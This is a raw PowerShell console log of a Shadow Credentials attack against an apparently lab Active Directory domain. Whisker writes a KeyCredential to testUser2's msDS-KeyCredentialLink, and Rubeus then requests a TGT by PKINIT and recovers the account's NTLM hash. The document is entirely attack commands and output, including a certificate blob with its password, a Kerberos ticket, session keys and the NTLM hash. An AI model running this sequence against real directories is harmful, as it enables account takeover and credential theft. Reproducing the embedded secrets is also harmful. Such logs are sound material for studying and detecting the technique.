PS C:\tools> .\Whisker.exe add /target:testUser2
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password z8hZgy3r9xm7h2EF
[*] Searching for the target account
[*] Target user found: CN=testUser2,OU=ShadowCreds2,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID f38a1ac4-e6b3-4b11-ab2c-298e17e68bc3
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:testUser2 /certificate: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 /password:"z8hZgy3r9xm7h2EF" /domain:mindfreak.lab.lan /dc:CrissDC01.mindfreak.lab.lan
 /getcredentials /show

PS C:\tools> .\Rubeus.exe asktgt /user:testUser2 /certificate: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 /password:"z8hZgy3r9xm7h2EF" /domain:mindfreak.lab.lan /dc:CrissDC01.mindfreak.lab.lan /getcredentials /show

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=testUser2 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mindfreak.lab.lan\testUser2'
[*] Using domain controller: 10.10.10.90:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGkjCCBo6gAwIBBaEDAgEWooIFlzCCBZNhggWPMIIFi6ADAgEFoRMbEU1JTkRGUkVBSy5MQUIuTEFO
      oiYwJKADAgECoR0wGxsGa3JidGd0GxFtaW5kZnJlYWsubGFiLmxhbqOCBUUwggVBoAMCARKhAwIBA6KC
      BTMEggUvgoNPBgqGqHnDCVE3p5Juan/vH72oNm+cEyl7117/X6fYF8+r9W5JU0+HEuG3nxCK+rV1sNqn
      gthFGuT833UmnN6qolmanvvnfJ+sc4opbg4bHhUamQ3oJshzyliVcxDgjBbXq/8fj4QNN2udV9xl0XuO
      PFeQk/aQ73VrHpExLswQmaCGQlL+Pg+rM8s+D9uT+8ExOhzQYIa/bDkau7gNWA7A3bpO/YahI+0LALK6
      mK5w2X9XcOrdEHSI5NkNcJVMzxW10eO5rRP2C4nmFPDozj5NDXlfvYW2vdRlHq7A7DbPEFNN6j+x6zMp
      u5krHQsZnmikG8gF2n9Cjf7glrSKc0JBAOGOnzOUZeO5mD92pVLOmmZYQzKzHBmOUCieab4pIcrN0pnz
      2nmTfF+GGyKeiF6sJcx0VYIP3MZqQFABWR7wuDDqof/PJtIhENDMXIP5+HAoFPihjrHleeGDwn2uUDAJ
      dU2oifa7t+vncdmVPDixl8Ixp2RR7NI1FqKvku9+bz0iYgAALOxm8OHbIWy6YR52ZvNS079HOBf3QFkK
      8CXVn46fsRZ+dJw4k6toic/j2iR6mA8WaPrSHtG6GUFeblf36BJ8ay1S6Cn+2JtgDmHCumUyMK7mtPQT
      mjZyKuROHg/mKOslkVlsf0c7Gtk7ez6hFRXuOcYamX5vS7UL8KW7VRKRca94+9WI3fjMMSPCcelbCjQh
      DU50Zaof6sRTBXdaNoGng/GfGyqegzAlTvbVUMdIRSAYhA6m+PL7ZWa2nXsWXfSBcEOv/XwQPiOIKw4Y
      TDKCDlNiysBqJuYEtzR0fJ4K1czeYoj/hvC714LdM/t3h0keA7Lvcifb9nLmOV4OiztMJ5In5JDGy6CL
      R6P+AfjjZEy99ono/fk2i8whEUW+Mp/xkt8xa3FPoCqZh8tV2A72HgUKO/xUscVanRHbT5BSmvghFx7Z
      8oiSQ+c16nAnLlgWNfCUao+HVU33O3PBYzjJms4SnwX9A3ubjNuZVDOFv2VOEGHru5gAVCr7iefv1pJr
      7Uahh3elVXfTJyC0pPYo1iHHgjmdcOVyME9bUDK5+doP/HK8a89quz4LsXF+/0GCobUr4OiHxbpVPcFB
      pGYmEYZR5B9E0tMuYdgTJGmFRoMjffYT0jCXe2B8dK8czTyFKMAvnVR83fspeKo8xdQskzUsBKYAPfnu
      jtQR9zuuBRBoAsDxCX03FEdOISTkcSPNr6gdHEo7biqu6kFrDPsro71t7uXUiIhui7iQMXr1v2jpVUMc
      JsTSqc3QR2koEe8A9KOjazpCroHJrl4JjRwbnSVM6RkGwTbgfb8uPS8gFh1x3z912F6afe0B0ar/WNg1
      FWt0g/237NbsC1rqZT9R5Du8Gue1RpN0vzdG1oD+x9UjXAo5lIjD6L/h10u/jmluGNs2S2VUmBfF7WJi
      GN92t/kuTiGELIRvW1tA71oWwU7Gd1X7x3UUcx2RJXayZiyqJADgxHTCJnnmDmbrTzN9MVI9HH9aTjsf
      NtUw81ibv+sSeem/VpgJ3suDnSR3tnO+FMXvuPFe/k4ccDMbR2uEvyawumQUPxNXOlNZoG3/CfbSMQV1
      XWHP8DoKzdnvwwZKkhm6ZLDYmC/OfKsFDUhP0j7oLxtaroZUWy13vVdMLGOXv+6fJUqZkipeXwDjWvr4
      Y/Y+c2XderCir3pQ9pBq3LclFg7cUyzMAuctf5U1vNTBf5tpWj4eJ4DlbwDTCwLz/yi+O2Hro3sRDrcL
      H/rXYkLVvwZLdkorYKOB5jCB46ADAgEAooHbBIHYfYHVMIHSoIHPMIHMMIHJoBswGaADAgEXoRIEED03
      1iVfYGyEm8NbtI/afkOhExsRTUlOREZSRUFLLkxBQi5MQU6iFjAUoAMCAQGhDTALGwl0ZXN0VXNlcjKj
      BwMFAEDhAAClERgPMjAyNTEyMTcxNDU5MTRaphEYDzIwMjUxMjE4MDA1OTE0WqcRGA8yMDI1MTIyNDE0
      NTkxNFqoExsRTUlOREZSRUFLLkxBQi5MQU6pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEW1pbmRmcmVhay5s
      YWIubGFu

  ServiceName              :  krbtgt/mindfreak.lab.lan
  ServiceRealm             :  MINDFREAK.LAB.LAN
  UserName                 :  testUser2 (NT_PRINCIPAL)
  UserRealm                :  MINDFREAK.LAB.LAN
  StartTime                :  12/17/2025 8:59:14 AM
  EndTime                  :  12/17/2025 6:59:14 PM
  RenewTill                :  12/24/2025 8:59:14 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  PTfWJV9gbISbw1u0j9p+Qw==
  ASREP (key)              :  02C0C7F0A428620954DCFA273F2C76C2

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A3DFA398D965026DE27B31D71C39122D
